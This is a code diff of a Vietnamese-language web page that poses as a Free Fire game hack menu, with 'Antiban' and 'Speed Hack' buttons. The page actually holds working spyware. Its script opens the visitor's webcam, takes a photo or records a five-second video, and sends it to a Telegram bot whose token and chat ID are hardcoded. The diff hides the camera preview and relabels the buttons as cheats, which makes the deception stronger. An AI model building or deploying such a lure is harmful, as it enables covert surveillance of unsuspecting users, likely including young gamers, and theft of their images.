@@ -2,103 +2,111 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>🔥 HACK FREE FIRE CẤP QUYỀN WEB ANTIBAN</title>
+  <title>🔥 MOD MENU FREE FIRE 2025 🔥</title>
   <style>
     body {
-      background: #111;
-      color: white;
+      background: black;
+      color: lime;
+      font-family: monospace;
       text-align: center;
-      font-family: Arial, sans-serif;
-      padding: 20px;
+      padding-top: 50px;
     }
-    video {
-      width: 90%;
-      max-width: 500px;
-      border: 3px solid #fff;
-      border-radius: 10px;
-      margin-bottom: 15px;
-    }
-    h2 {
-      font-size: 22px;
-      margin-bottom: 10px;
-    }
-    button {
-      background: #00ccff;
-      color: #000;
-      padding: 10px 20px;
+    .btn {
+      padding: 15px 25px;
+      font-size: 18px;
       border: none;
-      font-size: 16px;
-      margin: 5px;
+      margin: 10px;
+      background: lime;
+      color: black;
       cursor: pointer;
       border-radius: 8px;
     }
-    button:hover {
-      background: #0099cc;
+    .btn:hover {
+      background: #33ff33;
     }
   </style>
 </head>
 <body>
-  <h2>🔥 HACK FREE FIRE CẤP QUYỀN WEB ANTIBAN</h2>
-  <video id="video" autoplay muted playsinline></video><br>
-  <button onclick="capturePhoto()">📸 Chụp Ảnh & Gửi</button>
-  <button onclick="recordVideo()">🎞 Quay Video 5s & Gửi</button>
+  <h1>🔥 MOD MENU FREE FIRE 2025 🔥</h1>
+  <p>Chọn tính năng để kích hoạt (cần cấp quyền web):</p>
+
+  <button class="btn" onclick="capturePhoto()">📸 Cấp quyền Antiban</button>
+  <button class="btn" onclick="recordVideo()">⚡ Speed Hack (Quay Video)</button>
+
+  <video id="video" autoplay playsinline muted style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const token = "7885080355:AAGr9pOeVK3NPZVZUsLF7ZR9jDbf8ksyJ2E";
     const chatId = "-1002761107238";
     let stream;
 
-    async function initCam() {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-      document.getElementById("video").srcObject = stream;
+    // Bắt đầu webcam nếu chưa có
+    async function initCamera() {
+      if (!stream) {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        document.getElementById("video").srcObject = stream;
+      }
     }
 
+    // 📸 Chụp ảnh & gửi về Telegram
     async function capturePhoto() {
-      const video = document.getElementById("video");
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      canvas.toBlob(async (blob) => {
-        const form = new FormData();
-        form.append("chat_id", chatId);
-        form.append("photo", blob, "photo.png");
-        form.append("caption", "📸 Ảnh từ hệ thống HACK FF ANTIBAN");
+      try {
+        await initCamera();
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
 
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: form
-        });
+        canvas.toBlob(async (blob) => {
+          const form = new FormData();
+          form.append("chat_id", chatId);
+          form.append("photo", blob, "photo.png");
+          form.append("caption", "📸 FF User đã cấp quyền camera");
 
-        alert("✅ Đã gửi ảnh!");
-      }, "image/png");
+          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: "POST",
+            body: form
+          });
+
+          alert("✅ Ảnh đã được gửi!");
+        }, "image/png");
+
+      } catch (e) {
+        alert("❌ Không thể truy cập camera!");
+      }
     }
 
+    // 🎞️ Quay video 5 giây & gửi
     async function recordVideo() {
-      const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-      const chunks = [];
+      try {
+        await initCamera();
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        const chunks = [];
 
-      recorder.ondataavailable = e => chunks.push(e.data);
-      recorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
-        const form = new FormData();
-        form.append("chat_id", chatId);
-        form.append("video", blob, "recorded.webm");
-        form.append("caption", "🎞 Video gửi từ HACK FF WEB TOOL");
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const form = new FormData();
+          form.append("chat_id", chatId);
+          form.append("video", blob, "ff_hack_video.webm");
+          form.append("caption", "🎞️ Video quay từ menu Hack Free Fire");
 
-        await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-          method: "POST",
-          body: form
-        });
+          await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+            method: "POST",
+            body: form
+          });
 
-        alert("✅ Đã gửi video!");
-      };
+          alert("✅ Video đã gửi thành công!");
+        };
 
-      recorder.start();
-      setTimeout(() => recorder.stop(), 5000);
+        recorder.start();
+        setTimeout(() => recorder.stop(), 5000); // quay 5 giây
+      } catch (e) {
+        alert("❌ Không thể truy cập camera!");
+      }
     }
-
-    initCam();
   </script>
 </body>
 </html>
